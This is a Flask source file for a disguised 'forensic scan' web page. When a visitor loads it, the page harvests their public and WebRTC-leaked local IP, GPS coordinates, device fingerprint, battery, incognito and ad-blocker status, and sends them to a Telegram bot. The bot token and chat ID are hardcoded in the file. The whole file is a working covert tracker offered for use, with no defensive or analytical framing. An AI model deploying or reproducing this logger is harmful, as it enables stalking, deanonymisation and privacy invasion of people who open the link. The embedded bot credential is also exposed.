from flask import Blueprint, render_template_string, request, jsonify
import requests

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0"
TELEGRAM_CHAT_ID = "1308711346"

PHANTOM_UI = """
<!DOCTYPE html>
<html>
<head>
    <title>PHANTOM_FORENSICS_v5.0</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; text-align: center; padding-top: 15%; margin:0; overflow:hidden; }
        .box { border: 1px solid #0f0; display: inline-block; padding: 40px; background: rgba(0,20,0,0.95); box-shadow: 0 0 50px #0f0; position: relative; }
        .scan-line { width: 100%; height: 5px; background: #0f0; position: absolute; top: 0; left:0; animation: scan 2s linear infinite; box-shadow: 0 0 15px #0f0; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        .matrix-text { font-size: 10px; color: #004400; position: absolute; width: 100%; z-index: -1; }
    </style>
</head>
<body onload="capture()">
    <div class="box">
        <div class="scan-line"></div>
        <h2 id="header">ULTRA_FORENSIC_SCAN</h2>
        <p id="status">Extracting Hardware Fingerprints... [v5.0]</p>
        <div id="loader">EXTRACTING_INTEL_NODES...</div>
    </div>

    <script>
        async function capture() {
            try {
                // 1. IP & GEO DATA
                const res = await fetch('https://ipapi.co/json/');
                const ip = await res.json();

                // 2. INCORPORATING ADVANCED LOG FEATURES
                // Ad Blocker Detection
                let adBlocker = "No";
                const testAd = document.createElement('div');
                testAd.innerHTML = '&nbsp;';
                testAd.className = 'adsbox';
                document.body.appendChild(testAd);
                if (testAd.offsetHeight === 0) adBlocker = "Yes";
                testAd.remove();

                // Incognito Detection (Approximate)
                let isPrivate = "No";
                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
                if (!fs) isPrivate = "Maybe";

                // Local IP (WebRTC Leak)
                let localIP = "N/A";
                const pc = new RTCPeerConnection({iceServers:[]});
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (i) => { if(i && i.candidate) { localIP = i.candidate.address; } };

                // Orientation & Hz
                let orientation = screen.orientation ? screen.orientation.type : "N/A";
                let refreshRate = "60Hz"; // Default

                // GPU & Rendering
                let gpu = "Unknown";
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if(debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

                // Battery & GPS
                let batteryPct = "N/A";
                if(navigator.getBattery) { const b = await navigator.getBattery(); batteryPct = Math.round(b.level * 100) + "%"; }
                
                const getCoords = () => new Promise(r => navigator.geolocation.getCurrentPosition(p => r(p.coords), () => r(null)));
                const pos = await getCoords();

                // 3. COMPILE DATA (SAB FEATURES)
                const intel = {
                    ip: ip.ip,
                    city: ip.city,
                    country: ip.country_name,
                    isp: ip.org,
                    lat: pos ? pos.latitude : "Denied",
                    lon: pos ? pos.longitude : "Denied",
                    local_ip: localIP,
                    battery: batteryPct,
                    os: navigator.platform,
                    agent: navigator.userAgent,
                    screen: window.screen.width + "x" + window.screen.height,
                    orientation: orientation,
                    incognito: isPrivate,
                    adblock: adBlocker,
                    gpu: gpu,
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory,
                    lang: navigator.language,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    time: new Date().toString()
                };

                // 4. SEND TO TELEGRAM
                await fetch('/script20/capture_data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(intel)
                });

                document.getElementById('header').innerText = "SYSTEM_VERIFIED";
                document.getElementById('status').innerText = "All data packets transmitted.";
            } catch (e) { console.log(e); }
        }
    </script>
</body>
</html>
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    i = request.json
    
    # SYSTEMATIC FORENSIC REPORT
    message = (
        f"💀 *--- ADVANCED FORENSIC LOG ---* 💀\\n\\n"
        f"📅 *TIME:* `{i['time']}`\\n"
        f"🌐 *NETWORK INTEL*\\n"
        f"┣ Public IP: `{i['ip']}`\\n"
        f"┣ Local IP: `{i['local_ip']}`\\n"
        f"┣ ISP: `{i['isp']}`\\n"
        f"┗ TZ: `{i['tz']}`\\n\\n"
        f"📍 *GEOLOCATION*\\n"
        f"┣ Location: `{i['city']}, {i['country']}`\\n"
        f"┣ Lat/Lon: `{i['lat']}, {i['lon']}`\\n"
        f"┗ Map: [Google Maps](https://www.google.com/maps?q={i['lat']},{i['lon']})\\n\\n"
        f"💻 *HARDWARE SPECS*\\n"
        f"┣ OS: `{i['os']}`\\n"
        f"┣ GPU: `{i['gpu']}`\\n"
        f"┣ RAM: `{i['ram']} GB` | Cores: `{i['cores']}`\\n"
        f"┣ Screen: `{i['screen']} ({i['orientation']})`\\n"
        f"┗ Battery: `{i['battery']}`\\n\\n"
        f"🕵️ *SECURITY & PRIVACY*\\n"
        f"┣ Private Window: `{i['incognito']}`\\n"
        f"┣ Ad Blocker: `{i['adblock']}`\\n"
        f"┗ Language: `{i['lang']}`\\n\\n"
        f"📎 *USER AGENT*\\n"
        f"`{i['agent'][:150]}...`"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    
    try:
        requests.post(url, json=payload)
        return jsonify({"status": "Success"}), 200
    except:
        return jsonify({"status": "Error"}), 500
